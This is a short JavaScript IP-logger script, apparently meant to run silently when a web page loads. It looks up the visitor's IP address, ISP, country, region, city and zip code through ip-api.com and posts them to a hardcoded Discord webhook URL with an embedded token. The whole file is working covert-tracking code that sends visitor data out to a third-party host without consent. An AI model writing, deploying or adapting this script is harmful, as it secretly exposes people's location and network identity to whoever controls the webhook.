var webHookUrl = "https://discord.com/api/webhooks/977935516555169872/oEITIyKVlHry2B_PRxwDk0pRA8G5xBmSNXuRuJIKXvmz7ELv8iT8Y5P3wCdbQCF3k4a_";



const request = async() => {
    const response = await fetch('http://ip-api.com/json/');
    const data = await response.json();


    var ip = data.query;

    var provider = data.org + " (" + data.as + ")";

    var timezone = data.timezone;
    var country = data.country;
    var countryCode = data.countryCode.toLowerCase()
    var region = data.region + " (" + data.regionName + ")";
    var city = data.city;

    var zip = data.zip;
    var lat = data.lat;
    var lon = data.lon;


    var postRequest = new XMLHttpRequest();
    postRequest.open("POST", webHookUrl);

    postRequest.setRequestHeader('Content-type', 'application/json');

    var params = {
        username: "IP Results",
        avatar_url: "",
        content: "__**NEW IP Logged**__ \n" +

            "\n __**:globe_with_meridians: IP-Address:**__ \n" +
            ip +
            "\n \n__**:telephone: Provider:**__ \n" +
            provider +
            "\n \n__**:map: Timezone:**__ \n" +
            timezone +
            "\n \n__**:flag_" + countryCode + ": Country:**__ \n" +
            country +
            "\n \n __**:park: Region:**__ \n" +
            region +
            "\n \n__**:cityscape: Zip Code:**__ \n" +
            zip +
            "\n \n __**:cityscape: City:**__ \n" +
            city
    }

    postRequest.send(JSON.stringify(params));

}

request();